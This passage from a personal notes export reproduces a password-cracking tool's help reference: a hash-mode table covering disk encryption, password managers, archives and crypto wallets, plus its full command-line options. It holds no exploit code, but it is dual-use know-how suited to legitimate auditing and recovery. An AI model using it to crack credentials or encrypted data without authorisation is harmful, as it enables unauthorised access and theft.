  25900 | KNX IP Secure - Device Authentication Code                 | FTP, HTTP, SMTP, LDAP Server
  16400 | CRAM-MD5 Dovecot                                           | FTP, HTTP, SMTP, LDAP Server
   1411 | SSHA-256(Base64), LDAP {SSHA256}                           | FTP, HTTP, SMTP, LDAP Server
   1711 | SSHA-512(Base64), LDAP {SSHA512}                           | FTP, HTTP, SMTP, LDAP Server
  24900 | Dahua Authentication MD5                                   | FTP, HTTP, SMTP, LDAP Server
  10901 | RedHat 389-DS LDAP (PBKDF2-HMAC-SHA256)                    | FTP, HTTP, SMTP, LDAP Server
  15000 | FileZilla Server &gt;= 0.9.55                                 | FTP, HTTP, SMTP, LDAP Server
  12600 | ColdFusion 10+                                             | FTP, HTTP, SMTP, LDAP Server
   1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR)                      | FTP, HTTP, SMTP, LDAP Server
    141 | Episerver 6.x &lt; .NET 4                                     | FTP, HTTP, SMTP, LDAP Server
   1441 | Episerver 6.x &gt;= .NET 4                                    | FTP, HTTP, SMTP, LDAP Server
   1421 | hMailServer                                                | FTP, HTTP, SMTP, LDAP Server
    101 | nsldap, SHA-1(Base64), Netscape LDAP SHA                   | FTP, HTTP, SMTP, LDAP Server
    111 | nsldaps, SSHA-1(Base64), Netscape LDAP SSHA                | FTP, HTTP, SMTP, LDAP Server
   7700 | SAP CODVN B (BCODE)                                        | Enterprise Application Software (EAS)
   7701 | SAP CODVN B (BCODE) from RFC_READ_TABLE                    | Enterprise Application Software (EAS)
   7800 | SAP CODVN F/G (PASSCODE)                                   | Enterprise Application Software (EAS)
   7801 | SAP CODVN F/G (PASSCODE) from RFC_READ_TABLE               | Enterprise Application Software (EAS)
  10300 | SAP CODVN H (PWDSALTEDHASH) iSSHA-1                        | Enterprise Application Software (EAS)
    133 | PeopleSoft                                                 | Enterprise Application Software (EAS)
  13500 | PeopleSoft PS_TOKEN                                        | Enterprise Application Software (EAS)
  21500 | SolarWinds Orion                                           | Enterprise Application Software (EAS)
  21501 | SolarWinds Orion v2                                        | Enterprise Application Software (EAS)
     24 | SolarWinds Serv-U                                          | Enterprise Application Software (EAS)
   8600 | Lotus Notes/Domino 5                                       | Enterprise Application Software (EAS)
   8700 | Lotus Notes/Domino 6                                       | Enterprise Application Software (EAS)
   9100 | Lotus Notes/Domino 8                                       | Enterprise Application Software (EAS)
  26200 | OpenEdge Progress Encode                                   | Enterprise Application Software (EAS)
  20600 | Oracle Transportation Management (SHA256)                  | Enterprise Application Software (EAS)
   4711 | Huawei sha1(md5($pass).$salt)                              | Enterprise Application Software (EAS)
  20711 | AuthMe sha256                                              | Enterprise Application Software (EAS)
  22400 | AES Crypt (SHA256)                                         | Full-Disk Encryption (FDE)
  27400 | VMware VMX (PBKDF2-HMAC-SHA1 + AES-256-CBC)                | Full-Disk Encryption (FDE)
  14600 | LUKS v1 (legacy)                                           | Full-Disk Encryption (FDE)
  29541 | LUKS v1 RIPEMD-160 + AES                                   | Full-Disk Encryption (FDE)
  29542 | LUKS v1 RIPEMD-160 + Serpent                               | Full-Disk Encryption (FDE)
  29543 | LUKS v1 RIPEMD-160 + Twofish                               | Full-Disk Encryption (FDE)
  29511 | LUKS v1 SHA-1 + AES                                        | Full-Disk Encryption (FDE)
  29512 | LUKS v1 SHA-1 + Serpent                                    | Full-Disk Encryption (FDE)
  29513 | LUKS v1 SHA-1 + Twofish                                    | Full-Disk Encryption (FDE)
  29521 | LUKS v1 SHA-256 + AES                                      | Full-Disk Encryption (FDE)
  29522 | LUKS v1 SHA-256 + Serpent                                  | Full-Disk Encryption (FDE)
  29523 | LUKS v1 SHA-256 + Twofish                                  | Full-Disk Encryption (FDE)
  29531 | LUKS v1 SHA-512 + AES                                      | Full-Disk Encryption (FDE)
  29532 | LUKS v1 SHA-512 + Serpent                                  | Full-Disk Encryption (FDE)
  29533 | LUKS v1 SHA-512 + Twofish                                  | Full-Disk Encryption (FDE)
  13711 | VeraCrypt RIPEMD160 + XTS 512 bit (legacy)                 | Full-Disk Encryption (FDE)
  13712 | VeraCrypt RIPEMD160 + XTS 1024 bit (legacy)                | Full-Disk Encryption (FDE)
  13713 | VeraCrypt RIPEMD160 + XTS 1536 bit (legacy)                | Full-Disk Encryption (FDE)
  13741 | VeraCrypt RIPEMD160 + XTS 512 bit + boot-mode (legacy)     | Full-Disk Encryption (FDE)
  13742 | VeraCrypt RIPEMD160 + XTS 1024 bit + boot-mode (legacy)    | Full-Disk Encryption (FDE)
  13743 | VeraCrypt RIPEMD160 + XTS 1536 bit + boot-mode (legacy)    | Full-Disk Encryption (FDE)
  29411 | VeraCrypt RIPEMD160 + XTS 512 bit                          | Full-Disk Encryption (FDE)
  29412 | VeraCrypt RIPEMD160 + XTS 1024 bit                         | Full-Disk Encryption (FDE)
  29413 | VeraCrypt RIPEMD160 + XTS 1536 bit                         | Full-Disk Encryption (FDE)
  29441 | VeraCrypt RIPEMD160 + XTS 512 bit + boot-mode              | Full-Disk Encryption (FDE)
  29442 | VeraCrypt RIPEMD160 + XTS 1024 bit + boot-mode             | Full-Disk Encryption (FDE)
  29443 | VeraCrypt RIPEMD160 + XTS 1536 bit + boot-mode             | Full-Disk Encryption (FDE)
  13751 | VeraCrypt SHA256 + XTS 512 bit (legacy)                    | Full-Disk Encryption (FDE)
  13752 | VeraCrypt SHA256 + XTS 1024 bit (legacy)                   | Full-Disk Encryption (FDE)
  13753 | VeraCrypt SHA256 + XTS 1536 bit (legacy)                   | Full-Disk Encryption (FDE)
  13761 | VeraCrypt SHA256 + XTS 512 bit + boot-mode (legacy)        | Full-Disk Encryption (FDE)
  13762 | VeraCrypt SHA256 + XTS 1024 bit + boot-mode (legacy)       | Full-Disk Encryption (FDE)
  13763 | VeraCrypt SHA256 + XTS 1536 bit + boot-mode (legacy)       | Full-Disk Encryption (FDE)
  29451 | VeraCrypt SHA256 + XTS 512 bit                             | Full-Disk Encryption (FDE)
  29452 | VeraCrypt SHA256 + XTS 1024 bit                            | Full-Disk Encryption (FDE)
  29453 | VeraCrypt SHA256 + XTS 1536 bit                            | Full-Disk Encryption (FDE)
  29461 | VeraCrypt SHA256 + XTS 512 bit + boot-mode                 | Full-Disk Encryption (FDE)
  29462 | VeraCrypt SHA256 + XTS 1024 bit + boot-mode                | Full-Disk Encryption (FDE)
  29463 | VeraCrypt SHA256 + XTS 1536 bit + boot-mode                | Full-Disk Encryption (FDE)
  13721 | VeraCrypt SHA512 + XTS 512 bit (legacy)                    | Full-Disk Encryption (FDE)
  13722 | VeraCrypt SHA512 + XTS 1024 bit (legacy)                   | Full-Disk Encryption (FDE)
  13723 | VeraCrypt SHA512 + XTS 1536 bit (legacy)                   | Full-Disk Encryption (FDE)
  29421 | VeraCrypt SHA512 + XTS 512 bit                             | Full-Disk Encryption (FDE)
  29422 | VeraCrypt SHA512 + XTS 1024 bit                            | Full-Disk Encryption (FDE)
  29423 | VeraCrypt SHA512 + XTS 1536 bit                            | Full-Disk Encryption (FDE)
  13771 | VeraCrypt Streebog-512 + XTS 512 bit (legacy)              | Full-Disk Encryption (FDE)
  13772 | VeraCrypt Streebog-512 + XTS 1024 bit (legacy)             | Full-Disk Encryption (FDE)
  13773 | VeraCrypt Streebog-512 + XTS 1536 bit (legacy)             | Full-Disk Encryption (FDE)
  13781 | VeraCrypt Streebog-512 + XTS 512 bit + boot-mode (legacy)  | Full-Disk Encryption (FDE)
  13782 | VeraCrypt Streebog-512 + XTS 1024 bit + boot-mode (legacy) | Full-Disk Encryption (FDE)
  13783 | VeraCrypt Streebog-512 + XTS 1536 bit + boot-mode (legacy) | Full-Disk Encryption (FDE)
  29471 | VeraCrypt Streebog-512 + XTS 512 bit                       | Full-Disk Encryption (FDE)
  29472 | VeraCrypt Streebog-512 + XTS 1024 bit                      | Full-Disk Encryption (FDE)
  29473 | VeraCrypt Streebog-512 + XTS 1536 bit                      | Full-Disk Encryption (FDE)
  29481 | VeraCrypt Streebog-512 + XTS 512 bit + boot-mode           | Full-Disk Encryption (FDE)
  29482 | VeraCrypt Streebog-512 + XTS 1024 bit + boot-mode          | Full-Disk Encryption (FDE)
  29483 | VeraCrypt Streebog-512 + XTS 1536 bit + boot-mode          | Full-Disk Encryption (FDE)
  13731 | VeraCrypt Whirlpool + XTS 512 bit (legacy)                 | Full-Disk Encryption (FDE)
  13732 | VeraCrypt Whirlpool + XTS 1024 bit (legacy)                | Full-Disk Encryption (FDE)
  13733 | VeraCrypt Whirlpool + XTS 1536 bit (legacy)                | Full-Disk Encryption (FDE)
  29431 | VeraCrypt Whirlpool + XTS 512 bit                          | Full-Disk Encryption (FDE)
  29432 | VeraCrypt Whirlpool + XTS 1024 bit                         | Full-Disk Encryption (FDE)
  29433 | VeraCrypt Whirlpool + XTS 1536 bit                         | Full-Disk Encryption (FDE)
  23900 | BestCrypt v3 Volume Encryption                             | Full-Disk Encryption (FDE)
  16700 | FileVault 2                                                | Full-Disk Encryption (FDE)
  27500 | VirtualBox (PBKDF2-HMAC-SHA256 &amp; AES-128-XTS)              | Full-Disk Encryption (FDE)
  27600 | VirtualBox (PBKDF2-HMAC-SHA256 &amp; AES-256-XTS)              | Full-Disk Encryption (FDE)
  20011 | DiskCryptor SHA512 + XTS 512 bit                           | Full-Disk Encryption (FDE)
  20012 | DiskCryptor SHA512 + XTS 1024 bit                          | Full-Disk Encryption (FDE)
  20013 | DiskCryptor SHA512 + XTS 1536 bit                          | Full-Disk Encryption (FDE)
  22100 | BitLocker                                                  | Full-Disk Encryption (FDE)
  12900 | Android FDE (Samsung DEK)                                  | Full-Disk Encryption (FDE)
   8800 | Android FDE &lt;= 4.3                                         | Full-Disk Encryption (FDE)
  18300 | Apple File System (APFS)                                   | Full-Disk Encryption (FDE)
   6211 | TrueCrypt RIPEMD160 + XTS 512 bit (legacy)                 | Full-Disk Encryption (FDE)
   6212 | TrueCrypt RIPEMD160 + XTS 1024 bit (legacy)                | Full-Disk Encryption (FDE)
   6213 | TrueCrypt RIPEMD160 + XTS 1536 bit (legacy)                | Full-Disk Encryption (FDE)
   6241 | TrueCrypt RIPEMD160 + XTS 512 bit + boot-mode (legacy)     | Full-Disk Encryption (FDE)
   6242 | TrueCrypt RIPEMD160 + XTS 1024 bit + boot-mode (legacy)    | Full-Disk Encryption (FDE)
   6243 | TrueCrypt RIPEMD160 + XTS 1536 bit + boot-mode (legacy)    | Full-Disk Encryption (FDE)
  29311 | TrueCrypt RIPEMD160 + XTS 512 bit                          | Full-Disk Encryption (FDE)
  29312 | TrueCrypt RIPEMD160 + XTS 1024 bit                         | Full-Disk Encryption (FDE)
  29313 | TrueCrypt RIPEMD160 + XTS 1536 bit                         | Full-Disk Encryption (FDE)
  29341 | TrueCrypt RIPEMD160 + XTS 512 bit + boot-mode              | Full-Disk Encryption (FDE)
  29342 | TrueCrypt RIPEMD160 + XTS 1024 bit + boot-mode             | Full-Disk Encryption (FDE)
  29343 | TrueCrypt RIPEMD160 + XTS 1536 bit + boot-mode             | Full-Disk Encryption (FDE)
   6221 | TrueCrypt SHA512 + XTS 512 bit (legacy)                    | Full-Disk Encryption (FDE)
   6222 | TrueCrypt SHA512 + XTS 1024 bit (legacy)                   | Full-Disk Encryption (FDE)
   6223 | TrueCrypt SHA512 + XTS 1536 bit (legacy)                   | Full-Disk Encryption (FDE)
  29321 | TrueCrypt SHA512 + XTS 512 bit                             | Full-Disk Encryption (FDE)
  29322 | TrueCrypt SHA512 + XTS 1024 bit                            | Full-Disk Encryption (FDE)
  29323 | TrueCrypt SHA512 + XTS 1536 bit                            | Full-Disk Encryption (FDE)
   6231 | TrueCrypt Whirlpool + XTS 512 bit (legacy)                 | Full-Disk Encryption (FDE)
   6232 | TrueCrypt Whirlpool + XTS 1024 bit (legacy)                | Full-Disk Encryption (FDE)
   6233 | TrueCrypt Whirlpool + XTS 1536 bit (legacy)                | Full-Disk Encryption (FDE)
  29331 | TrueCrypt Whirlpool + XTS 512 bit                          | Full-Disk Encryption (FDE)
  29332 | TrueCrypt Whirlpool + XTS 1024 bit                         | Full-Disk Encryption (FDE)
  29333 | TrueCrypt Whirlpool + XTS 1536 bit                         | Full-Disk Encryption (FDE)
  12200 | eCryptfs                                                   | Full-Disk Encryption (FDE)
  10400 | PDF 1.1 - 1.3 (Acrobat 2 - 4)                              | Document
  10410 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #1                 | Document
  10420 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #2                 | Document
  10500 | PDF 1.4 - 1.6 (Acrobat 5 - 8)                              | Document
  25400 | PDF 1.4 - 1.6 (Acrobat 5 - 8) - user and owner pass        | Document
  10600 | PDF 1.7 Level 3 (Acrobat 9)                                | Document
  10700 | PDF 1.7 Level 8 (Acrobat 10 - 11)                          | Document
   9400 | MS Office 2007                                             | Document
   9500 | MS Office 2010                                             | Document
   9600 | MS Office 2013                                             | Document
  25300 | MS Office 2016 - SheetProtection                           | Document
   9700 | MS Office &lt;= 2003 $0/$1, MD5 + RC4                         | Document
   9710 | MS Office &lt;= 2003 $0/$1, MD5 + RC4, collider #1            | Document
   9720 | MS Office &lt;= 2003 $0/$1, MD5 + RC4, collider #2            | Document
   9810 | MS Office &lt;= 2003 $3, SHA1 + RC4, collider #1              | Document
   9820 | MS Office &lt;= 2003 $3, SHA1 + RC4, collider #2              | Document
   9800 | MS Office &lt;= 2003 $3/$4, SHA1 + RC4                        | Document
  18400 | Open Document Format (ODF) 1.2 (SHA-256, AES)              | Document
  18600 | Open Document Format (ODF) 1.1 (SHA-1, Blowfish)           | Document
  16200 | Apple Secure Notes                                         | Document
  23300 | Apple iWork                                                | Document
   6600 | 1Password, agilekeychain                                   | Password Manager
   8200 | 1Password, cloudkeychain                                   | Password Manager
   9000 | Password Safe v2                                           | Password Manager
   5200 | Password Safe v3                                           | Password Manager
   6800 | LastPass + LastPass sniffed                                | Password Manager
  13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)                | Password Manager
  29700 | KeePass 1 (AES/Twofish) and KeePass 2 (AES) - keyfile only mode | Password Manager
  23400 | Bitwarden                                                  | Password Manager
  16900 | Ansible Vault                                              | Password Manager
  26000 | Mozilla key3.db                                            | Password Manager
  26100 | Mozilla key4.db                                            | Password Manager
  23100 | Apple Keychain                                             | Password Manager
  11600 | 7-Zip                                                      | Archive
  12500 | RAR3-hp                                                    | Archive
  23800 | RAR3-p (Compressed)                                        | Archive
  23700 | RAR3-p (Uncompressed)                                      | Archive
  13000 | RAR5                                                       | Archive
  17220 | PKZIP (Compressed Multi-File)                              | Archive
  17200 | PKZIP (Compressed)                                         | Archive
  17225 | PKZIP (Mixed Multi-File)                                   | Archive
  17230 | PKZIP (Mixed Multi-File Checksum-Only)                     | Archive
  17210 | PKZIP (Uncompressed)                                       | Archive
  20500 | PKZIP Master Key                                           | Archive
  20510 | PKZIP Master Key (6 byte optimization)                     | Archive
  23001 | SecureZIP AES-128                                          | Archive
  23002 | SecureZIP AES-192                                          | Archive
  23003 | SecureZIP AES-256                                          | Archive
  13600 | WinZip                                                     | Archive
  18900 | Android Backup                                             | Archive
  24700 | Stuffit5                                                   | Archive
  13200 | AxCrypt 1                                                  | Archive
  13300 | AxCrypt 1 in-memory SHA1                                   | Archive
  23500 | AxCrypt 2 AES-128                                          | Archive
  23600 | AxCrypt 2 AES-256                                          | Archive
  14700 | iTunes backup &lt; 10.0                                       | Archive
  14800 | iTunes backup &gt;= 10.0                                      | Archive
   8400 | WBB3 (Woltlab Burning Board)                               | Forums, CMS, E-Commerce
   2612 | PHPS                                                       | Forums, CMS, E-Commerce
    121 | SMF (Simple Machines Forum) &gt; v1.1                         | Forums, CMS, E-Commerce
   3711 | MediaWiki B type                                           | Forums, CMS, E-Commerce
   4521 | Redmine                                                    | Forums, CMS, E-Commerce
  24800 | Umbraco HMAC-SHA1                                          | Forums, CMS, E-Commerce
     11 | Joomla &lt; 2.5.18                                            | Forums, CMS, E-Commerce
  13900 | OpenCart                                                   | Forums, CMS, E-Commerce
  11000 | PrestaShop                                                 | Forums, CMS, E-Commerce
  16000 | Tripcode                                                   | Forums, CMS, E-Commerce
   7900 | Drupal7                                                    | Forums, CMS, E-Commerce
   4522 | PunBB                                                      | Forums, CMS, E-Commerce
   2811 | MyBB 1.2+, IPB2+ (Invision Power Board)                    | Forums, CMS, E-Commerce
   2611 | vBulletin &lt; v3.8.5                                         | Forums, CMS, E-Commerce
   2711 | vBulletin &gt;= v3.8.5                                        | Forums, CMS, E-Commerce
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce
     21 | osCommerce, xt:Commerce                                    | Forums, CMS, E-Commerce
  18100 | TOTP (HMAC-SHA1)                                           | One-Time Password
   2000 | STDOUT                                                     | Plaintext
  99999 | Plaintext                                                  | Plaintext
  21600 | Web2py pbkdf2-sha512                                       | Framework
  10000 | Django (PBKDF2-SHA256)                                     | Framework
    124 | Django (SHA-1)                                             | Framework
  12001 | Atlassian (PBKDF2-HMAC-SHA1)                               | Framework
  19500 | Ruby on Rails Restful-Authentication                       | Framework
  27200 | Ruby on Rails Restful Auth (one round, no sitekey)         | Framework
  30000 | Python Werkzeug MD5 (HMAC-MD5 (key = $salt))               | Framework
  30120 | Python Werkzeug SHA256 (HMAC-SHA256 (key = $salt))         | Framework
  20200 | Python passlib pbkdf2-sha512                               | Framework
  20300 | Python passlib pbkdf2-sha256                               | Framework
  20400 | Python passlib pbkdf2-sha1                                 | Framework
  24410 | PKCS#8 Private Keys (PBKDF2-HMAC-SHA1 + 3DES/AES)          | Private Key
  24420 | PKCS#8 Private Keys (PBKDF2-HMAC-SHA256 + 3DES/AES)        | Private Key
  15500 | JKS Java Key Store Private Keys (SHA1)                     | Private Key
  22911 | RSA/DSA/EC/OpenSSH Private Keys ($0$)                      | Private Key
  22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$)                      | Private Key
  22931 | RSA/DSA/EC/OpenSSH Private Keys ($1, $3$)                  | Private Key
  22941 | RSA/DSA/EC/OpenSSH Private Keys ($4$)                      | Private Key
  22951 | RSA/DSA/EC/OpenSSH Private Keys ($5$)                      | Private Key
  23200 | XMPP SCRAM PBKDF2-SHA1                                     | Instant Messaging Service
  28300 | Teamspeak 3 (channel hash)                                 | Instant Messaging Service
  22600 | Telegram Desktop &lt; v2.1.14 (PBKDF2-HMAC-SHA1)              | Instant Messaging Service
  24500 | Telegram Desktop &gt;= v2.1.14 (PBKDF2-HMAC-SHA512)           | Instant Messaging Service
  22301 | Telegram Mobile App Passcode (SHA256)                      | Instant Messaging Service
     23 | Skype                                                      | Instant Messaging Service
  29600 | Terra Station Wallet (AES256-CBC(PBKDF2($pass)))           | Cryptocurrency Wallet
  26600 | MetaMask Wallet                                            | Cryptocurrency Wallet
  21000 | BitShares v0.x - sha512(sha512_bin(pass))                  | Cryptocurrency Wallet
  28501 | Bitcoin WIF private key (P2PKH), compressed                | Cryptocurrency Wallet
  28502 | Bitcoin WIF private key (P2PKH), uncompressed              | Cryptocurrency Wallet
  28503 | Bitcoin WIF private key (P2WPKH, Bech32), compressed       | Cryptocurrency Wallet
  28504 | Bitcoin WIF private key (P2WPKH, Bech32), uncompressed     | Cryptocurrency Wallet
  28505 | Bitcoin WIF private key (P2SH(P2WPKH)), compressed         | Cryptocurrency Wallet
  28506 | Bitcoin WIF private key (P2SH(P2WPKH)), uncompressed       | Cryptocurrency Wallet
  11300 | Bitcoin/Litecoin wallet.dat                                | Cryptocurrency Wallet
  16600 | Electrum Wallet (Salt-Type 1-3)                            | Cryptocurrency Wallet
  21700 | Electrum Wallet (Salt-Type 4)                              | Cryptocurrency Wallet
  21800 | Electrum Wallet (Salt-Type 5)                              | Cryptocurrency Wallet
  12700 | Blockchain, My Wallet                                      | Cryptocurrency Wallet
  15200 | Blockchain, My Wallet, V2                                  | Cryptocurrency Wallet
  18800 | Blockchain, My Wallet, Second Password (SHA256)            | Cryptocurrency Wallet
  25500 | Stargazer Stellar Wallet XLM                               | Cryptocurrency Wallet
  16300 | Ethereum Pre-Sale Wallet, PBKDF2-HMAC-SHA256               | Cryptocurrency Wallet
  15600 | Ethereum Wallet, PBKDF2-HMAC-SHA256                        | Cryptocurrency Wallet
  15700 | Ethereum Wallet, SCRYPT                                    | Cryptocurrency Wallet
  22500 | MultiBit Classic .key (MD5)                                | Cryptocurrency Wallet
  27700 | MultiBit Classic .wallet (scrypt)                          | Cryptocurrency Wallet
  22700 | MultiBit HD (scrypt)                                       | Cryptocurrency Wallet
  28200 | Exodus Desktop Wallet (scrypt)                             | Cryptocurrency Wallet</rich_text>
          </node>
          <node name="OpenCL Device" unique_id="268" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687155004" ts_lastsave="1687155011">
            <rich_text>- [ OpenCL Device Types ] -

  # | Device Type
 ===+=============
  1 | CPU
  2 | GPU
  3 | FPGA, DSP, Co-Processor
</rich_text>
          </node>
          <node name="Options" unique_id="261" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687154747" ts_lastsave="1687155073">
            <rich_text>- [ Options ] -

 Options Short / Long           | Type | Description                                          | Example
=================+===+===========+==========+=================================
 -m, --hash-type                | Num  | Hash-type, references below (otherwise autodetect)   | -m 1000
 -a, --attack-mode              | Num  | Attack-mode, see references below                    | -a 3
 -V, --version                  |      | Print version                                        |
 -h, --help                     |      | Print help                                           |
     --quiet                    |      | Suppress output                                      |
     --hex-charset              |      | Assume charset is given in hex                       |
     --hex-salt                 |      | Assume salt is given in hex                          |
     --hex-wordlist             |      | Assume words in wordlist are given in hex            |
     --force                    |      | Ignore warnings                                      |
     --deprecated-check-disable |      | Enable deprecated plugins                            |
     --status                   |      | Enable automatic update of the status screen         |
     --status-json              |      | Enable JSON format for status output                 |
     --status-timer             | Num  | Sets seconds between status screen updates to X      | --status-timer=1
     --stdin-timeout-abort      | Num  | Abort if there is no input from stdin for X seconds  | --stdin-timeout-abort=300
     --machine-readable         |      | Display the status view in a machine-readable format |
     --keep-guessing            |      | Keep guessing the hash after it has been cracked     |
     --self-test-disable        |      | Disable self-test functionality on startup           |
     --loopback                 |      | Add new plains to induct directory                   |
     --markov-hcstat2           | File | Specify hcstat2 file to use                          | --markov-hcstat2=my.hcstat2
     --markov-disable           |      | Disables markov-chains, emulates classic brute-force |
     --markov-classic           |      | Enables classic markov-chains, no per-position       |
     --markov-inverse           |      | Enables inverse markov-chains, no per-position       |
 -t, --markov-threshold         | Num  | Threshold X when to stop accepting new markov-chains | -t 50
     --runtime                  | Num  | Abort session after X seconds of runtime             | --runtime=10
     --session                  | Str  | Define specific session name                         | --session=mysession
     --restore                  |      | Restore session from --session                       |
     --restore-disable          |      | Do not write restore file                            |
     --restore-file-path        | File | Specific path to restore file                        | --restore-file-path=x.restore
 -o, --outfile                  | File | Define outfile for recovered hash                    | -o outfile.txt
     --outfile-format           | Str  | Outfile format to use, separated with commas         | --outfile-format=1,3
     --outfile-autohex-disable  |      | Disable the use of $HEX[] in output plains           |
     --outfile-check-timer      | Num  | Sets seconds between outfile checks to X             | --outfile-check-timer=30
     --wordlist-autohex-disable |      | Disable the conversion of $HEX[] from the wordlist   |
 -p, --separator                | Char | Separator char for hashlists and outfile             | -p :
     --stdout                   |      | Do not crack a hash, instead print candidates only   |
     --show                     |      | Compare hashlist with potfile; show cracked hashes   |
     --left                     |      | Compare hashlist with potfile; show uncracked hashes |
     --username                 |      | Enable ignoring of usernames in hashfile             |
     --remove                   |      | Enable removal of hashes once they are cracked       |
     --remove-timer             | Num  | Update input hash file each X seconds                | --remove-timer=30
     --potfile-disable          |      | Do not write potfile                                 |
     --potfile-path             | File | Specific path to potfile                             | --potfile-path=my.pot
     --encoding-from            | Code | Force internal wordlist encoding from X              | --encoding-from=iso-8859-15
     --encoding-to              | Code | Force internal wordlist encoding to X                | --encoding-to=utf-32le
     --debug-mode               | Num  | Defines the debug mode (hybrid only by using rules)  | --debug-mode=4
     --debug-file               | File | Output file for debugging rules                      | --debug-file=good.log
     --induction-dir            | Dir  | Specify the induction directory to use for loopback  | --induction=inducts
     --outfile-check-dir        | Dir  | Specify the outfile directory to monitor for plains  | --outfile-check-dir=x
     --logfile-disable          |      | Disable the logfile                                  |
     --hccapx-message-pair      | Num  | Load only message pairs from hccapx matching X       | --hccapx-message-pair=2
     --nonce-error-corrections  | Num  | The BF size range to replace AP's nonce last bytes   | --nonce-error-corrections=16
     --keyboard-layout-mapping  | File | Keyboard layout mapping table for special hash-modes | --keyb=german.hckmap
     --truecrypt-keyfiles       | File | Keyfiles to use, separated with commas               | --truecrypt-keyf=x.png
     --veracrypt-keyfiles       | File | Keyfiles to use, separated with commas               | --veracrypt-keyf=x.txt
     --veracrypt-pim-start      | Num  | VeraCrypt personal iterations multiplier start       | --veracrypt-pim-start=450
     --veracrypt-pim-stop       | Num  | VeraCrypt personal iterations multiplier stop        | --veracrypt-pim-stop=500
 -b, --benchmark                |      | Run benchmark of selected hash-modes                 |
     --benchmark-all            |      | Run benchmark of all hash-modes (requires -b)        |
     --speed-only               |      | Return expected speed of the attack, then quit       |
     --progress-only            |      | Return ideal progress step size and time to process  |
 -c, --segment-size             | Num  | Sets size in MB to cache from the wordfile to X      | -c 32
     --bitmap-min               | Num  | Sets minimum bits allowed for bitmaps to X           | --bitmap-min=24
     --bitmap-max               | Num  | Sets maximum bits allowed for bitmaps to X           | --bitmap-max=24
     --cpu-affinity             | Str  | Locks to CPU devices, separated with commas          | --cpu-affinity=1,2,3
     --hook-threads             | Num  | Sets number of threads for a hook (per compute unit) | --hook-threads=8
     --hash-info                |      | Show information for each hash-mode                  |
     --example-hashes           |      | Alias of --hash-info                                 |
     --backend-ignore-cuda      |      | Do not try to open CUDA interface on startup         |
     --backend-ignore-hip       |      | Do not try to open HIP interface on startup          |
     --backend-ignore-metal     |      | Do not try to open Metal interface on startup        |
     --backend-ignore-opencl    |      | Do not try to open OpenCL interface on startup       |
 -I, --backend-info             |      | Show system/evironment/backend API info              | -I or -II
 -d, --backend-devices          | Str  | Backend devices to use, separated with commas        | -d 1
 -D, --opencl-device-types      | Str  | OpenCL device-types to use, separated with commas    | -D 1
 -O, --optimized-kernel-enable  |      | Enable optimized kernels (limits password length)    |
 -M, --multiply-accel-disable   |      | Disable multiply kernel-accel with processor count   |
 -w, --workload-profile         | Num  | Enable a specific workload profile, see pool below   | -w 3
 -n, --kernel-accel             | Num  | Manual workload tuning, set outerloop step size to X | -n 64
 -u, --kernel-loops             | Num  | Manual workload tuning, set innerloop step size to X | -u 256
 -T, --kernel-threads           | Num  | Manual workload tuning, set thread count to X        | -T 64
     --backend-vector-width     | Num  | Manually override backend vector-width to X          | --backend-vector=4
     --spin-damp                | Num  | Use CPU for device synchronization, in percent       | --spin-damp=10
     --hwmon-disable            |      | Disable temperature and fanspeed reads and triggers  |
     --hwmon-temp-abort         | Num  | Abort if temperature reaches X degrees Celsius       | --hwmon-temp-abort=100
     --scrypt-tmto              | Num  | Manually override TMTO value for scrypt to X         | --scrypt-tmto=3
 -s, --skip                     | Num  | Skip X words from the start                          | -s 1000000
 -l, --limit                    | Num  | Limit X words from the start + skipped words         | -l 1000000
     --keyspace                 |      | Show keyspace base:mod values and quit               |
 -j, --rule-left                | Rule | Single rule applied to each word from left wordlist  | -j 'c'
 -k, --rule-right               | Rule | Single rule applied to each word from right wordlist | -k '^-'
 -r, --rules-file               | File | Multiple rules applied to each word from wordlists   | -r rules/best64.rule
 -g, --generate-rules           | Num  | Generate X random rules                              | -g 10000
     --generate-rules-func-min  | Num  | Force min X functions per rule                       |
     --generate-rules-func-max  | Num  | Force max X functions per rule                       |
     --generate-rules-func-sel  | Str  | Pool of rule operators valid for random rule engine  | --generate-rules-func-sel=ioTlc
     --generate-rules-seed      | Num  | Force RNG seed set to X                              |
 -1, --custom-charset1          | CS   | User-defined charset ?1                              | -1 ?l?d?u
 -2, --custom-charset2          | CS   | User-defined charset ?2                              | -2 ?l?d?s
 -3, --custom-charset3          | CS   | User-defined charset ?3                              |
 -4, --custom-charset4          | CS   | User-defined charset ?4                              |
     --identify                 |      | Shows all supported algorithms for input hashes      | --identify my.hash
 -i, --increment                |      | Enable mask increment mode                           |
     --increment-min            | Num  | Start mask incrementing at X                         | --increment-min=4
     --increment-max            | Num  | Stop mask incrementing at X                          | --increment-max=8
 -S, --slow-candidates          |      | Enable slower (but advanced) candidate generators    |
     --brain-server             |      | Enable brain server                                  |
     --brain-server-timer       | Num  | Update the brain server dump each X seconds (min:60) | --brain-server-timer=300
 -z, --brain-client             |      | Enable brain client, activates -S                    |
     --brain-client-features    | Num  | Define brain client features, see below              | --brain-client-features=3
     --brain-host               | Str  | Brain server host (IP or domain)                     | --brain-host=127.0.0.1
     --brain-port               | Port | Brain server port                                    | --brain-port=13743
     --brain-password           | Str  | Brain server authentication password                 | --brain-password=bZfhCvGUSjRq
     --brain-session            | Hex  | Overrides automatically calculated brain session     | --brain-session=0x2ae611db
     --brain-session-whitelist  | Hex  | Allow given sessions only, separated with commas     | --brain-session-whitelist=0x2ae611db</rich_text>
          </node>
          <node name="Outfile Formats" unique_id="264" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687154898" ts_lastsave="1687154904">
            <rich_text>- [ Outfile Formats ] -

  # | Format
 ===+========
  1 | hash[:salt]
